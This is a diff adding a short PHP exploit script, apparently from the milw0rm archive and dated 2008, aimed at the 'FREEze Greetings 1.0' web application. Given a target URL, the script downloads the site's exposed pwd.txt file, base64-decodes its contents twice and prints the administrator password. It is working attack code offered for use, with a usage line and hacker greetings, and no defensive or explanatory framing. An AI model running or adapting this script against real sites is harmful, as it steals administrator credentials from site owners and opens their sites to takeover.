@@ -1,0 +1,27 @@
+<?php
+
+/**
+* FREEze Greetings 1.0 Remote Password Retrieve Exploit
+* Exploit by cOndemned 
+*
+* Greetz : suN8Hclf, 0in, m4r1usz, str0ke, rtgn, doctor, sid.psycho [...]
+* Special thx to ZaBeaTy for developing such a sexy regexp ;) Thx m8 
+*/
+
+echo <<< Header
+
+[~] FREEze Greetings 1.0 Remote Password Retrieve Exploit
+[~] Exploit by cOndemned [ Prints decoded admin password ]
+
+Header;
+
+if($argc != 2) printf("[~] Usage : php %s <target_with_path>\r\n\r\n", $argv[0]) and exit;
+
+$out = (preg_match('!^([^ ]+)$!sei', file_get_contents($argv[1] . '/pwd.txt'), $r) && preg_match('!^([^\|\|]+)\|\|!sei', base64_decode($r[1]), $pass))
+	? sprintf("Password : %s", base64_decode($pass[1])) : 'Exploitation failed';
+
+printf("[~] %s \r\n\r\n", $out);
+
+?>
+
+# milw0rm.com [2008-11-17]
